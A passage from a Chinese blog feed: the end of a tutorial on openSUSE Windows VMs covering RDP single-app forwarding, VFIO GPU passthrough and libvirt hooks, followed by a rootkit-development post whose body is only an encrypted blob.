<code>*计算机配置-&gt;管理模板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;远程会话环境</code>，在其中配置 RDP 硬体加速，以此获得更好的 RDP 性能：</p><p><img src="https://s2.loli.net/2024/02/26/ILEM9OrqKZFApou.png"></p><p>然后打开注册表编辑器路径 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations</code> ，新建一个名为 <code>DWMFRAMEINTERVAL</code> 的 DWORD 值并设为 <code>15</code>：</p><p><img src="https://s2.loli.net/2024/02/26/gXABCzNwMH8KRYE.png"></p><p>重启即可</p><h2 id="配置-RDP-连接"><a href="#配置-RDP-连接" class="headerlink" title="配置 RDP 连接"></a>配置 RDP 连接</h2><blockquote><p>如果你的 RDP 连接没有声音，可以参见 <a href="https://www.anyviewer.cn/how-to/rdp-audio-not-working-6540.html">这个链接</a> 进行修复</p><p>如果无法连接上 Guest ，也可以检查一下是不是 Windows 防火墙的问题</p></blockquote><h3 id="使用-xfreerdp-仅运行单个应用"><a href="#使用-xfreerdp-仅运行单个应用" class="headerlink" title="使用 xfreerdp 仅运行单个应用"></a>使用 xfreerdp 仅运行单个应用</h3><p>首先安装上 freedrp：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> freerdp</span><br></code></pre></td></tr></table></figure><p>接下来输入如下命令进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xfreerdp /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone /app:<span class="hljs-string">&quot;explorer.exe&quot;</span></span><br></code></pre></td></tr></table></figure><p>接下来就是见证奇迹的时刻——</p><p><img src="https://s2.loli.net/2024/02/22/GgCDkhwiznLF1fZ.png" alt="碉堡了好吗"></p><p>这里的 RDP 命令帮我们配置好了共享 <code>/home</code> 文件夹和剪贴板，所以你可以<strong>直接往 VM 里粘贴包括文件在内的东西</strong>，也可以在 VM 中访问 Host 侧的文件夹：）</p><blockquote></blockquote><h3 id="使用-sdl-freerdp"><a href="#使用-sdl-freerdp" class="headerlink" title="使用 sdl-freerdp"></a><em>使用 sdl-freerdp</em></h3><blockquote><p>和 wlfreerdp 一样，不支持仅转发单个应用（似乎是 wayland 缺失了某些特性）</p></blockquote><p>zypper 官方源里没有，可以手动添加，也可以像笔者一样通过 flatpak 进行安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak install com.freerdp.FreeRDP</span><br></code></pre></td></tr></table></figure><p>然后运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">flatpak run com.freerdp.FreeRDP /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone</span><br></code></pre></td></tr></table></figure><h3 id="在应用列表中添加-Windows-程序图标"><a href="#在应用列表中添加-Windows-程序图标" class="headerlink" title="在应用列表中添加 Windows 程序图标"></a>在应用列表中添加 Windows 程序图标</h3><p>把自己想要运行的 Windows 程序路径写成 Desktop Entry 就行，后缀名改为 <code>.desktop</code> 并放在 <code>/usr/share/applicaitions/</code> 目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Desktop Entry]<br><span class="hljs-comment"># 该入口的类型</span><br>Type=Application<br><span class="hljs-comment"># 是否显示终端（可选）</span><br>Terminal=<span class="hljs-literal">false</span><br><span class="hljs-comment"># 点击该入口执行的命令</span><br>Exec=xfreerdp /rfx /d:<span class="hljs-string">&quot;你的 VM 主机名&quot;</span> /u:<span class="hljs-string">&quot;你的 VM 用户名&quot;</span> /p:<span class="hljs-string">&quot;你的 VM 密码&quot;</span> /v:<span class="hljs-string">&quot;你的 VM 的 IP&quot;</span> +auto-reconnect +home-drive +clipboard /scale:100 /dynamic-resolution /audio-mode:0 /microphone /app:<span class="hljs-string">&quot;VM 里的可执行程序路径名&quot;</span><br><span class="hljs-comment"># 该程序名称</span><br>Name=Name of Application<br><span class="hljs-comment"># 入口显示的图标路径（可选）</span><br>Icon=/path/to/icon<br></code></pre></td></tr></table></figure><h1 id="0x03-实现显卡直通-，这样就能玩👴最爱的-Genshin-Impact-了"><a href="#0x03-实现显卡直通-，这样就能玩👴最爱的-Genshin-Impact-了" class="headerlink" title="0x03. 实现显卡直通 ，这样就能玩👴最爱的 Genshin Impact 了"></a>0x03. 实现显卡直通 <del>，这样就能玩👴最爱的 <code>Genshin Impact</code> 了</del></h1><blockquote><p>参考 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/app-gpu-passthru.html">SUSE - Configuring GPU Pass-Through for NVIDIA cards</a></p></blockquote><p>众所周知，《原神》是由米哈游自主研发的一款全新开放世界冒险游戏。游戏发生在一个被称作「提瓦特」的幻想世界，在这里，被神选中的人将被授予「神之眼」，导引元素之力。你将扮演一位名为「旅行者」的神秘角色，在自由的旅行中邂逅性格各异、能力独特的同伴们，和他们一起击败强敌，找回失散的亲人——同时，逐步发掘「原神」的真相。我现在每天玩原神都能赚150原石，每个月差不多5000原石的收入， 也就是现实生活中每个月5000美元的收入水平，换算过来最少也30000人民币，虽然我 只有14岁，但是已经超越了中国绝大多数人(包括你)的水平，这便是原神给我的骄傲的资本…</p><p><img src="https://s2.loli.net/2024/02/22/kNXAmoqZslUjEYb.png" alt="差不多得了😅屁大点事都要拐上原神，原神一没招你惹你，二没干伤天害理的事情，到底怎么你了让你一直无脑抹黑，米哈游每天费尽心思的文化输出弘扬中国文化，你这种喷子只会在网上敲键盘诋毁良心公司，中国游戏的未来就是被你这种人毁掉的😅"></p><p><del>扯得有些远了，</del> 总而言之有的时候我们想要在 Windows 上进行一些需要用显卡才能完成的任务，亦或是使用显卡进行图形加速等，virt-manager 默认提供的 RedHat QXL 终究只是一个由 QEMU 进行模拟的设备，性能上自然很难与真正的显卡相比拟</p><p>而笔者的笔记本刚好有两个显卡：一个是 Intel 的核显，另一个是一张 NVIDIA 的卡，因为笔者日常也不用这台电脑炼丹（ <del>再说了就一张小破 4060 能练个啥玩意出来</del> ），因此笔者决定将 N 卡直通到 VM 当中以提高 VM 的图形化性能， <del>同时闲暇之余还能打开 VM 玩玩游戏这样子</del></p><h2 id="配置-IOMMU"><a href="#配置-IOMMU" class="headerlink" title="配置 IOMMU"></a>配置 IOMMU</h2><p>在 <a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">《系统虚拟化导论》</a> 中我们知道集成在北桥上的 IOMMU 可以通过 DMA 重映射与中断重映射的方式让我们实现 I&#x2F;O 虚拟化：</p><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png"></p><p>IOMMU 默认是关闭的，因此首先我们要先启用 IOMMU 这一功能，首先检查一下你是否有两张卡以及是否在 UEFI 里开启了虚拟化相关特性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">dmesg | grep -e <span class="hljs-string">&quot;Directed I/O&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci | grep -i <span class="hljs-string">&quot;vga&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/22/SKYOdgF1s9U2Za4.png" alt="image.png"></p><blockquote><p>如果你只有一张显示卡的话，<strong>那笔者不推荐弄显卡直通</strong>，因为同一时间只有一个系统能够占用显卡，Guest 拿掉之后 Host 肯定是没有图形输出的，Guest 关机后才能回到 Host 图形界面，<strong>这种直通还不如直接装双系统后重启回 Windows</strong></p></blockquote><p>在 <code>/etc/default/grub</code> 的 <code>GRUB_CMDLINE_LINUX_DEFAULT</code> 参数中添加 <code>intel_iommu=on iommu=pt rd.driver.pre=vfio-pci</code> （AMD CPU 则添加 <code>iommu=pt amd_iommu=on rd.driver.pre=vfio-pci</code>），之后通过如下命令更新 grub：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo grub2-mkconfig -o /boot/grub2/grub.cfg</span> <br></code></pre></td></tr></table></figure><p>重启后通过 <code>dmesg |  grep -e DMAR -e IOMMU</code> 命令我们便能看到 IOMMU 已经开启：</p><p><img src="https://s2.loli.net/2024/02/22/kDgealrxURMKE6d.png" alt="image.png"></p><p>接下来我们运行 <code>lspci -nn | grep -i nvidia</code> 命令找到 N 卡后面的设备 id,记录下这串数字：</p><p><img src="https://s2.loli.net/2024/02/22/fNKQEu2z8VSoHOv.png" alt="image.png"></p><h2 id="实现显卡动态直通"><a href="#实现显卡动态直通" class="headerlink" title="实现显卡动态直通"></a>实现显卡动态直通</h2><p>大部分双显卡直通的教程上来就是让把老 N 卡的 nouveau 驱动给卸了，但是笔者<a href="https://arttnba3.cn/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/">一开始就装了 N 卡闭源驱动</a>，现在再给卸了有点不太现实，而且万一以后有空了也想用这台电脑小练点丹也说不定，所以这里笔者选择配置<strong>动态显卡重装载策略</strong>——</p><ul><li>默认卸载 N 卡驱动，在需要时再装载 N 卡驱动</li><li>在 VM 启动时卸载 N 卡驱动，在 VM 结束运行后再重新装载，<strong>桌面环境则仅在核显上运行</strong>（其实 Linux 桌面环境通常情况下用核显的性能基本上都是足够的）</li></ul><h3 id="配置-VFIO"><a href="#配置-VFIO" class="headerlink" title="配置 VFIO"></a>配置 VFIO</h3><p>首先配置 VFIO，这里我们要防止 nvidia 驱动在开机时便被装载（后面用到再手动装载，否则会比较麻烦），首先在 <code>/etc/modprobe.d/</code> 中创建文件 <code>vfio.conf</code> 并写入我们刚刚获取到的标识符：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">options</span> vfio-pci ids=<span class="hljs-number">10</span>de:<span class="hljs-number">28</span>a0<br></code></pre></td></tr></table></figure><p>然后创建文件 <code>/etc/dracut.conf.d/gpu-passthrough.conf</code> 以装载 <a href="https://documentation.suse.com/zh-cn/sles/15-SP3/html/SLES-all/gloss-vt-glossary.html#gloss-vt-acronym-vfio">VFIO</a> 驱动：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">add_drivers+=<span class="hljs-string">&quot;vfio vfio_iommu_type1 vfio_pci vfio_virqfd&quot;</span><br></code></pre></td></tr></table></figure><p>接下来使用 dracut 重新生成 initrd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo dracut --force /boot/initrd $(uname -r)<br></code></pre></td></tr></table></figure><p>然后为 Guest VM 禁用 MSR（防止崩溃），创建 <code>/etc/modprobe.d/kvm.conf</code> 文件并写入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">options</span> kvm ignore_msrs=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>重启电脑后你就会发现 N 卡驱动载入失败，因为此时 VFIO 先一步取得了N 卡的所有权：）</p><p><img src="https://s2.loli.net/2024/02/25/xZzI4O9J5niXDqf.png"></p><p>如果你想再用上 N 卡闭源驱动搞事情，可以通过如下脚本装载回 N 卡驱动，这里我们用 <code>virsh</code> 来重新装载设备，注意查看 N 卡对应的 pci 号设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo modprobe -r vfio-pci<br>virsh nodedev-reattach pci_0000_01_00_0<br>sudo modprobe nvidia<br>sudo modprobe nvidia_modeset<br>sudo modprobe nvidia_uvm<br>sudo modprobe nvidia_drm<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/sfDjCAB149aK5Ye.png"></p><p>重新用回 VFIO 的话就是反着来的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo modprobe -r nvidia_drm<br>sudo modprobe -r nvidia_uvm<br>sudo modprobe -r nvidia_modeset<br>sudo modprobe -r nvidia<br>virsh nodedev-detach pci_0000_01_00_0<br>sudo modprobe vfio-pci<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/PDVGtKZJ3TSujkF.png"></p><h3 id="配置显卡直通"><a href="#配置显卡直通" class="headerlink" title="配置显卡直通"></a>配置显卡直通</h3><p>接下来我们将这张卡通进 VM 中，首先用如下脚本查看显卡所在 IOMMU 组都有哪些设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">shopt</span> -s nullglob<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> /sys/kernel/iommu_groups/*/devices/*; <span class="hljs-keyword">do</span> <br>    n=<span class="hljs-variable">$&#123;d#*/iommu_groups/*&#125;</span>; n=<span class="hljs-variable">$&#123;n%%/*&#125;</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;IOMMU Group %s &#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$n</span>&quot;</span><br>    lspci -nns <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;d##*/&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/uWZP85BcjrdQs7x.png" alt="比较幸运的是笔者的 N 卡所在组只有一个设备"></p><p>接下来在 virt-manager 中添加 <code>PCI Host Device</code> 选<strong>显卡所在的整个 IOMMU group 设备</strong>即可：</p><p><img src="https://s2.loli.net/2024/02/25/AKMU9xRwONFc4jC.png" alt="小学生都会做"></p><blockquote><p>启动前注意把 Video 换成 <code>virtio</code> 而非 <code>QXL</code> ，否则在 SPICE 服务启动后鼠标没法正常工作：(</p></blockquote><p>之后就完成直通了：</p><p><img src="https://s2.loli.net/2024/02/26/9Ycy386z1DJwiWB.png"></p><p><img src="https://s2.loli.net/2024/02/25/LVaHAEvjuQZhdqy.png"></p><p>如果你和笔者一样电脑自带的视频输出口都走独显，则可以通过外接显示器直接输出虚拟机内容，这样就不需要忍受 virtio&#x2F;qxl 那极其底下的性能了：</p><p><img src="https://s2.loli.net/2024/02/28/5mcCALesxZbzUfq.jpg"></p><h3 id="配置-libvirt-hook-动态装载显卡"><a href="#配置-libvirt-hook-动态装载显卡" class="headerlink" title="配置 libvirt hook 动态装载显卡"></a>配置 libvirt hook 动态装载显卡</h3><p>我们只需要将前面的两个脚本写到  <code>/etc/libvirt/hooks/qemu</code> 脚本中即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>VM_NAME=<span class="hljs-string">&quot;Windows11PhysVM&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> == <span class="hljs-variable">$VM_NAME</span> ]] &amp;&amp; [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> || <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;stopped&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>   <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>     sudo modprobe -r nvidia_drm<br>     sudo modprobe -r nvidia_uvm<br>     sudo modprobe -r nvidia_modeset<br>     sudo modprobe -r nvidia<br>     virsh nodedev-detach pci_0000_01_00_0<br>     sudo modprobe vfio-pci<br>   <span class="hljs-keyword">else</span><br>     sudo modprobe -r vfio-pci<br>     virsh nodedev-reattach pci_0000_01_00_0<br>     sudo modprobe nvidia<br>     sudo modprobe nvidia_modeset<br>     sudo modprobe nvidia_uvm<br>     sudo modprobe nvidia_drm<br>   <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h3 id="在虚拟机里玩原神-（To-do）"><a href="#在虚拟机里玩原神-（To-do）" class="headerlink" title="在虚拟机里玩原神 （To do）"></a><em><del>在虚拟机里玩原神</del></em> （To do）</h3><p><del>最后自然就是大家最喜欢的，原神，启动——</del> 家人们大事不妙了，👴发现原神有 VM 检测， <del>今天玩不了了，咱们下回再见吧</del></p><p><img src="https://s2.loli.net/2024/02/28/JcLyUmIOVAjeYv2.png"></p><h1 id="0x04-一些亟待解决的小问题"><a href="#0x04-一些亟待解决的小问题" class="headerlink" title="0x04. 一些亟待解决的小问题"></a>0x04. 一些亟待解决的小问题</h1><h2 id="虚拟化组件问题汇总"><a href="#虚拟化组件问题汇总" class="headerlink" title="虚拟化组件问题汇总"></a>虚拟化组件问题汇总</h2><h3 id="1-libvirtd-不会自启动"><a href="#1-libvirtd-不会自启动" class="headerlink" title="1. libvirtd 不会自启动"></a>1. libvirtd 不会自启动</h3><p>似乎是因为 libvirtd 被拆成了数个小组件，所以不管怎么 <code>enable</code> 都没法让他自启动，但是 libvirtd 不启动的话 virtiofsd 也没法正常工作，因此暂时还需要每次启动后都得手动 <code>systemctl start libvirtd.service</code></p><h2 id="xfreerdp-问题综合汇总"><a href="#xfreerdp-问题综合汇总" class="headerlink" title="xfreerdp 问题综合汇总"></a>xfreerdp 问题综合汇总</h2><h3 id="1-存在画面撕裂"><a href="#1-存在画面撕裂" class="headerlink" title="1. 存在画面撕裂"></a>1. 存在画面撕裂</h3><p>尤其是在仅转发单个应用而非整个桌面时</p><h3 id="2-新开单应用转发导致所有窗口重新开启"><a href="#2-新开单应用转发导致所有窗口重新开启" class="headerlink" title="2. 新开单应用转发导致所有窗口重新开启"></a>2. 新开单应用转发导致所有窗口重新开启</h3><p>其实桌面都在同一个 session 里，但是 xfreerdp 需要重新建一遍窗口，感觉是设计上的缺陷 ：(</p><h3 id="3-app-参数纯后台应用无法保持窗口留存"><a href="#3-app-参数纯后台应用无法保持窗口留存" class="headerlink" title="3. /app 参数纯后台应用无法保持窗口留存"></a>3. <code>/app</code> 参数纯后台应用无法保持窗口留存</h3><p>开个酷狗&#x2F;网易云之类的窗口一关 RDP 连接就也没了，感觉还是设计上的缺陷 ：(</p><h2 id="不能玩-👴-最爱的-Genshin-Impact"><a href="#不能玩-👴-最爱的-Genshin-Impact" class="headerlink" title="不能玩 👴 最爱的 Genshin Impact"></a><del>不能玩 👴 最爱的 Genshin Impact</del></h2><p>原神似乎用了比较严苛的虚拟化检查方案，所以这个后日再议了（笑）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;4202 年了，Linux Desktop 还会好吗？&lt;/p&gt;</summary>
    
    
    
    <category term="SUSE" scheme="https://arttnba3.github.io/categories/SUSE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="openSUSE" scheme="https://arttnba3.github.io/tags/openSUSE/"/>
    
    <category term="openSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/openSUSE-Tumbleweed/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【VIRUS.0x00】现代 Linux rootkit 开发导论</title>
    <link href="https://arttnba3.github.io/2024/01/01/VIRUS-0X00-LINUX_ROOTKIT/"/>
    <id>https://arttnba3.github.io/2024/01/01/VIRUS-0X00-LINUX_ROOTKIT/</id>
    <published>2023-12-31T17:21:32.000Z</published>
    <updated>2024-12-25T13:23:14.876Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="没写完，别急，急的话可以先看先知上的半成品" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="7150e2cd99784e241b9be7571fe98ad76034d289c0a6340ae61d67496b6988bf">f677d6c1615e5477f274160d582541c6499bc27281a4a6519cf8aefc368b1bfd6eaec1f1c40964741832d122823bb60514e575bb9de401f52bbf7b14d4745275e747a01f6f72c040d32e2fd5b4ee724507639c5812c4b7c84482f72bcab9a8de00f3a5cefe8bd5867ff308da969ad685234484c18067cb5ed47e6bdb6296ee6b417f61264ecad82e77220b54b7f6aff461fd1e4cd5165d385c0c7665504722fc5e984e72e737f113a4cbd6c06c9d77363230d30071a9ec960cccee7923c53073944fa1dd2d2ab1d909b31168735014a10e1e7abc173a0f271ce199a56cd3b82263d79d6272650ad660676efa3fc84acbafbc341925331d258833b8933591bbaad24c56d7459dd5d28196125a24b069588f85d3d8b362857afd54c2b457a4a28dca468dcb65b9b15a2dbb5f71cc7b40b6743fbb4c6efa421f18b940c0a8f62dc564452b932abef43979e9d390c05a7848ccca0d7349b639ebd444b08819554fc7f7bcdf3b806b13d15d7ec84c3376e6ecc75837badd15f923d73f4b3d163f403500683cf7a55721f41231c969a8207fe9e2afdb8a736a26bc73b1fc69669403f3427eb19300f85f80ee4d628d361141f2e38383662c2ef905254b033f6fbc11b0ce89e80046423da409bc80b6823aee30b620833572ced4ce82be53ccc33135af423521a4699713411b743a230ce78c00440e6b896af71809d6b530dcf55277b33d31c6a494c2e050d93214db7a90e026f03d412c419a6034b795895916a98af7d6738a0c86e7eb07e47267b10bf7a179980a38b9e9031556e0d7719b75215dbba33f5708e0e49f709c4e97b32b2534dab4f4031120d37a6e7b8b27b362cde2824db65402cd3c2f2d00fd33d08be218f020566de74ed7f561b6cf4b70849d3ca3437e2a94db67a0816ed7db4018792bc8a2c3eef4c3ca59de4048c6fb7f5dd3127d66b0572af6a82c5f09e5f5d8432b94fd0b3dab76f29b63b66b87757e5913188f1ae3e0570bc5a09e3e86b4e4593a13a713d172fe498f3ca39c9b5dc96b79454c07056ee436693160529b14c219f329d513565684f771ada01cdf5523a38854e16a5558a744b71607dff98e4cb4e638897d3efea5f6956c68fa508cf45aa46da749eb9310c1919b6cbdbb6e9bc46ae384d35cdd26945a8becded6ed0e22a87f7d8f1156566d3266c5f13d23ff929d6a176c39a930e126a29c7eb058956b255a94eaf5fc976bf7fc8449232c40367b2518b797f900a9d93925a61c0cfb030eaacdd79cd17cb418d1b5b19830ebc0491f6227a41ed2511d354b22279f7cc678c2e854251adc5e7cea3d6fd5b36b8af603eb481a3d00d7c5bc503ecfbaa85a4499e1224244d5dc09f23fa643d6b4c06dcc83bf6b3270088c198ba0c7f596cedf390c1fa167d74e6189b49c94d3b5ef2457abdb6ec53542558b8d609bdc1f3031cf687991072ed5350fa68ee0ad9f2efb9ebd44e558925092da6119606aa68f6d701eb953ad728dca3373b6e0ee41daa514a387ed9ddcbca819b04cf33997d5410e8d831c6bff99ac9a846a54447a4c0afe80bdc820b198e2fa5203eeab46a1f09c78c86fc0b9d0ca801c3c4f476dcc174c10aedbb8ac731e8312215b09c419f673e280025de551c6635726d33e232f38ed06ea6a7825e35fb38c934ab08f7a935845cf2021d44d2d2237b689036d3ef6ab3a3406ee5c2b7979d1d66017a245319c5992e7b2753b42c0fe456dc004fddeb1b8ef9c8796fc3ec3a1eb63f23eb2baea844f396a439e2ae641e7920576dbd0436acfc7d8b9b0e05054965b256f5c6e10e97dbf1c5bf2c63847438eb919e10cca146a24578831048d44bbddec1d4c30a269fbad6840c734c76e1eec0e4d3a7cbfd4facc1c08720f6ab93191650374da7fb268574a7d809d79b2c8f50e96678811cf503bbca67a42ed5102e9f9a8fe6967c65d255410a2f6d53d84248f97619dfdb75e06829d2d46a63c58a23ec60cef904ee55bcc06bbf04166683d1636bd21080625185c9e73c1612ad14ec667df89bb28934fe3a800c4e26d01c5dc1179f4b438e6b8b45581b612fe2c78ad5b43e9f3a26d2e0ca467150adbce73b3ee602911eae64603375ab9c842611cc46b446d6346bbc4d500d82db5ed91114cde5236bedd54b143e46334fefb3c1ac3502e17e7c8aebd577290da3d1bcd5d5c3ff7e3bf2e1a5a432517f62963af9bf3cff83696b7859f21e8b0890dcba014d12f5fabf168c62c3ab8f3352735174c214dc2deaa68565e415f93bfe361bece156fa0ca401bb857f125c9e0e8f4e58ce84db6ad7dd2dc47c896fc577b6e527c0e75d37c5df32157c15ee34c9a251af03dfeb878e8321f3701d9667dd8c3ecca9ebd37648d7cb2733fbce15ed303031da76681a61f3e2052e9d1a82e5168a8ff4f5330c08295c92355f57731b285cb89c3fefdf247a5d6eaa027950754585804982b6a110fb84d24ca0ad0c634139714a37d0e5ddf7cfe4d494c5a87c9475499466394ae1ae51d9f64ed65fe5311ed8203794819a813c5b0fbf0b1659d6e3c4fafa2570a1d549c024658fee150e647b2da956cffa1a383712ec0743e90d788728ba0e807998909bb5e07faf99d753ef0adba4b10e3e7e8480a5a9711b68b7228e4a9be54cead5ac387f06ed203c0a96ca4d05d2fa9097ca8faeedded7bb0a2fa1ec4b4901b630758227b481877439a93adb691c41e6f69ca2e0c38e66e95e1d0efc430042236fe03388ba23c740a44b49cd30a08a6367c852dbc24387fea9a9e25e06d6aa0e264c0530bc5a98b021c425b1b6b3c0358693dd24f9e45d284f3f780fcd680fde787c799491d8540aab48e6711b2b22098d33abdc2183edae452444d99d41cd8e2423b15e16544860703fe0e5a86dc3af76e916ddd04e21a7e1c0ade6899a9a9583390bf0634b97d12a6219255bb519865d465e69582dc8157cbdeacb9ff0fdccea60db61b2c9bc5f2379dad577a8df5152347808838bb0cdf9638fa5256c502a54f24d1375ab02756099079b41e8fde380b73912bb8c130aba12e5673b5dc3d50ba6941938d41418ae31cc3b689530b176614ea53cbea7c49578b9e9ffd2f93e11d4d2915de13413088f3065e60f8aeaa94c9cb196c90ee738a7a2171ccf5921eef03334888b90c279ac2aa81727f142500da1c4cfbeb6ebc6a2faafae26a5e40f5f858f5085603a6842962ccfe74e79ab282dc174fbb527f37f95f42325b2de0cb09ddb9a183bf840c3811d4375ed0d98fb7328e501da0716560e9c6b590a26b1377f4c368491f155b47c32e8cb4475dee2d2affb10dfe690c5097b714b740aacc7b42f258973b311853f9d60de0d6856def773d50b67e4073c86b1f3e9c06e8414c15827b2c0f00c09fd1a105c390e3702b71a9bbe42802276fdd807b6d7ce9a9fdb25991fc45f44417d2ddb1e6ef0edab5b7e703ab0100d54c0fac5bd05b32af41542763766a17d5bfb65a086cd5927bd4ba79ad5e08d301b27feb0120111c44a22defd8ed6857a7db1da3dd2e8b1a029fc62cee40d51ae27b5e8e3e65e93b5ee58ed16d068c831007f6c7981b314d9a5140bd1dc79d902befce5569552d475f5506d5e2d3661828d0a800d2fbc364f5ad909b537f217c46b45c2b5a7fbd2ac6cd4a2ece0f0952f5250d738fd49f14c5e3560f6417f2e05f7527b2baf5efd8d7329d9e636db8e2156666139c56c20e4980e858fd048da3ae862cfbb1dacd1ecd89d78d3bee9049edbcff49b3d1633a8b3b5678b43620b0813472b4c68ec7ecebed793fadbe6ad9a07f1f2a22407527c7a0b55783e74341f69e911d8cadbe61ff0de2de3acbc6e5bbcb43e72d82c3cda985bcf96cfb0f83d204c76a0e5bdf75df57db873c04e6178fdd744f8536f07d85e58f6839f69416633dfda764264d38b14ee2186b578ecaa6fdabe6ddd3bc64ff80722cda2b03fdc370c19bfba1be4a